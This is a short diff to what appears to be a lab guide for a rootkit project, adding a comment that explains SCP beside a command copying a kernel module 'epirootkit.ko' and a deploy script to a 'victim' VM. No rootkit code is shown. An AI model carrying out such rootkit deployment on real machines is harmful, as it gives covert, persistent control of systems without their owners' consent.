@@ -118,6 +118,7 @@ Transfer rootkit to victim VM:
 
 ```bash
 # Option A: SCP
+# SCP is like cp (copy) but with SSH
 scp rootkit/epirootkit.ko rootkit/deploy_rootkit.sh victim@192.168.200.10:~/
 
 # Option B: HTTP server
